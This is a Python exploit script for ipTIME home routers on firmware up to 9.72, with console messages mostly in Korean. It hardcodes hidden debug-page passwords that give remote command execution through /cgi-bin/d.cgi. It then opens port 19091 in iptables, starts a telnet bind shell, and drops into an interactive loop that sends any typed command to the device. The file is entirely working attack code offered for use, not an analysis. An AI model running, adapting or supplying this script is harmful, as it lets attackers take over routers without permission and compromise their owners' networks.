# -*- conding: utf-8 -*
import requests
import sys

pass_old = '#notenoughmineral^'
pass_new = '!@dnjsrurelqjrm*&'

id = 'admin'
pw = 'admin'

_Passname = 'aaksjdkfj'
_Passkey = ''

_destination = '/cgi-bin/d.cgi'
_settingdestination = '/cgi-bin/timepro.cgi'

_startParam = {_Passname : _Passkey }
_commandParam = {'act':'1','fname':'','cmd':''}

# REMOTE_SUPPORT MANAGEMENT SWITCH!
_enable = 'tmenu=sysconf&smenu=misc&act=remote_support&commit=&hostname=&autosaving=1&fakedns=0&nologin=0&wbm_popup=0&upnp=1&led_flag=0&ispfake=0&newpath=&remote_support=1&apcplan=1'
_disable = 'tmenu=sysconf&smenu=misc&act=remote_support&commit=&hostname=&autosaving=1&fakedns=0&nologin=0&wbm_popup=0&upnp=1&led_flag=0&ispfake=0&newpath=&remote_support=0&apcplan=1'

### chmod disabled!
_telnet_check = 'ls -al /sbin'
_permission_enable = '/bin/chmod 777 /sbin/iptables'
_permission_enable2 = '/bin/chmod 777 /sbin/utelnetd'
_telnet_enable_1 = '/sbin/iptables -A INPUT -p tcp --dport 19091 -j ACCEPT'
#_telnet_enable_1 = '/sbin/iptables -A INPUT -p tcp -m -tcp --dport 2323 -j ACCEPT'
_get_iptables = '/sbin/iptables --list'
_telnet_enable_2 = '/sbin/utelnetd -p 19091'
_demon_mode = 'cat /default/var/boa_vh.conf'

sess = requests.session()

def get(args):
    return sess.get(url='http://%s%s' % (sys.argv[1], _destination), params=args).text

def startup():
    x = _startParam.copy()
    if get(x).find('Command Name : ') == -1:
        print ("[오류] 디버깅 페이지에 접근할 수 없습니당 흐규흐규..")
        exit(0)
    print ("[o] Debugging page exist!")

def deleteChunk(ref):
    findx = ref.find('<font size=-1>')
    ref = ref[findx:]
    ref = ref.replace('<font size=-1>','')
    ref = ref.replace('\n</font><br>','')
    return ref

def bind_shell():
    x =_commandParam.copy()
    x['cmd'] = _telnet_check
    ref = get(x)
    findx = ref.find('<font size=-1>')
    ref = ref[findx:]
    ref = ref.replace('<font size=-1>','')
    ref = ref.replace('\n</font><br>','')
    if ref.find('utelnetd') == -1:
        print ('[오류] 텔넷 대몬이 루트에서 실행되고 있지 않아요 흐규흐규ㅜㅜ')
        print ('[오류] 익스플로잇할 수 없다구요 ㅜㅜ')
        exit(0)
    x['cmd'] = _demon_mode
    ref = deleteChunk(get(x))
    if ref.find('root') == -1:
        print ('[오류] httpd 데몬이 루트에서 실행되고 있지않아요 흐규흐규ㅜㅜ')
        print ('[오류] no exploitable -.-')
    else:
        print ('[알림] 익스플로잇 성공! 진행중 ...')
        x =_commandParam.copy()
        sys.stdout.write('[알림] IP테이블 설정중! ')
        x['cmd'] = _telnet_enable_1
        ref = get(x)
        x['cmd'] = _get_iptables
        ref = deleteChunk(get(x))
        if ref.find('19091') == -1 :
            sys.stdout.write('Failed!')
            return
        sys.stdout.write('OK!')
        print ('')
        print ('[알림] 텔넷 대몬 실행중!!')
        x['cmd'] = _telnet_enable_2
        get(x)
        print ('[o] Binding shell command executed. check it yourself. (port:19091)')

def showcmd(cmd):
    x = _commandParam.copy()
    x['cmd'] = cmd
    ref = get(x)
    t = deleteChunk(ref)
    if t == '>' : return()
    print (t)

if __name__ == '__main__':

    print ('Support : IPTIME 7.?? - 9.72')
   
    print ('펌웨어 버전을 입력해주세요! : (~ 9.12 = 0) / (9.14 ~ 9.72 = 1)')
    print ('exit를 눌러 나갈 수 있습니다.')

    if len(sys.argv) < 3:
        print ('\n>>> python3 hostname firmware_version [id] [pw]\n')
        print ('펌웨어 버전을 입력해주세요! : (~ 9.12 = 0) / (9.14 ~ 9.72 = 1)')
        exit(0)

    sys.argv[1] = sys.argv[1].replace('http://','')
    sys.argv[1] = sys.argv[1].replace('/','')

    if int(sys.argv[2]) is 0:
        _Passkey = pass_old
    else:
        _Passkey = pass_new

    try:
        id = sys.argv[3]
        pw = sys.argv[4]
        sess.auth = (id, pw)
    except:
        pass

    _commandParam['aaksjdkfj'] = _Passkey

    while True:
        sys.__stdout__.write (sys.argv[1] + '> ')
        x = input()
        if x == 'exit': exit(0)
        elif x == 'bind-shell': bind_shell()
        elif x != '' : showcmd(x)
